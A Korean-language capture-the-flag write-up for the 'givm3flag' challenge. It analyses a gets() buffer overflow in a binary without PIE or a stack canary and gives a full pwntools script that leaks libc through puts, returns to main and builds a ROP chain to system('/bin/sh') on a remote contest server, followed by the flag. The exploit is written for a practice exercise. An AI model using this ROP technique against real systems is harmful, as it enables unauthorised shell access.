```bash
[*] '/mnt/d/hk/_contest/2024JBU-CTF/givm3flag/challenge'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
pie, canary가 없다.

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s1[76]; // [rsp+0h] [rbp-50h] BYREF
  int v5; // [rsp+4Ch] [rbp-4h]

  initialize(argc, argv, envp);
  v5 = 0;
  puts("Welcome to the Joongbu CTF!!");
  gets(s1);
  if ( !strcmp(s1, "Give me the flag") )
  {
    puts("That's not possible haha");
  }
  else if ( !strcmp(s1, "G i v e m e t h e f l a g") )
  {
    puts("Nope~");
  }
  else if ( !strcmp(s1, "G  i  v  e  m  e  t  h  e  f  l  a  g") )
  {
    puts("Hmm.. I'm thinking about it.");
  }
  else if ( !strcmp(s1, "Please give me the flag..") )
  {
    puts("I can't hear you well.");
  }
  else
  {
    if ( strcmp(s1, "FLAG, give it to me quickly") )
    {
      puts("Sorry.. I don't understand what you're saying");
      exit(1);
    }
    puts("Alright!!! I'll give it to you right now!!");
    if ( v5 == 1 )
    {
      puts("Here's the flag~ XD");
      system("cat ./FFFFLLLLAAAAGGGG");
    }
    else
    {
      puts("There's no flag?");
    }
  }
  return 0;
}
```

gets 함수에서 bof가 발생한다. libc_base를 얻기 위해서 Ret2main을 할 것이므로, main을 진행하면서 exit 당하지 않는 입력을 주어야 한다. 아무거나 상관없지만 필자는 `FLAG, give it to me quickly`를 사용했다.
첫 번째 main에서 libc_base를 구하고, 두 번째 main에서 쉘을 따는 ROP를 진행했다.
# Exploit code

```python
from pwn import *
from time import *

# context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

p = remote('44.210.9.208', 10016)
# p = process('./challenge')
e = ELF('./challenge')
l = ELF('./libc.so.6')

# gdb.attach(p)
# pause()

bss = e.bss() + 0x1000
pop_rdi = 0x00000000004013d3
main = 0x40121d
ret = 0x000000000040101a

payload = b'FLAG, give it to me quickly'.ljust(0x50, b'\x00') + p64(bss) + p64(pop_rdi) + p64(e.got['puts']) + p64(e.sym['puts']) + p64(main)
p.sendlineafter(b'Welcome to the Joongbu CTF!!', payload)
p.recvuntil(b'no flag?')
p.recvline()
l.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - l.sym['puts']
print(hex(l.address))

binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']

payload = b'FLAG, give it to me quickly'.ljust(0x50, b'\x00') + p64(bss)
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter(b'Welcome to the Joongbu CTF!!', payload)
p.interactive()
```

`scpCTF{I'll_gi3YouF7ag!!!_ConGratua4ion@}`